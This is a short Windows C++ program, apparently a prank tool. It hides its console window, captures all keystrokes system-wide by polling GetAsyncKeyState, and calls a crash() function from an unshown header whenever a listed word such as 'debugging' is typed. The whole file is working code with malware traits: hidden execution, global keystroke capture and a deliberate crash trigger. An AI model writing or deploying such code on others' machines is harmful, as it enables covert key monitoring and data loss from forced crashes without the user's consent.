#include <Windows.h>
#include <iostream>
#include <vector>
#include <deque>
#include <algorithm>
#include <thread>

#include "crasher.h"

int main() 
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);

	std::vector<std::string> bannedwords = {
		"shit",
		/*
		 * ... banned words here
		 */
		"debugging"
	};

	size_t maxlen = 0;
	for (std::string s : bannedwords) 
	{
		size_t size = s.length();
		if (size > maxlen) 
		{
			maxlen = size;
		}
	}

	std::deque<char> buffer;

	while (true)
	{
		Sleep(10);
		for (int k = 8; k <= 190; k++)
		{
			if (GetAsyncKeyState(k) == -32767)
			{
				if (buffer.size() > maxlen - 1) {
					buffer.pop_front();
				}

				buffer.push_back(static_cast<char>(k));
			}

			std::string str(buffer.begin(), buffer.end());
			std::transform(str.begin(), str.end(), str.begin(), std::tolower);

			for (const std::string& bannedword : bannedwords)
			{
				if (str.find(bannedword) != std::string::npos)
				{
					crash();
				}
			}

		}
	}

	return EXIT_SUCCESS;
}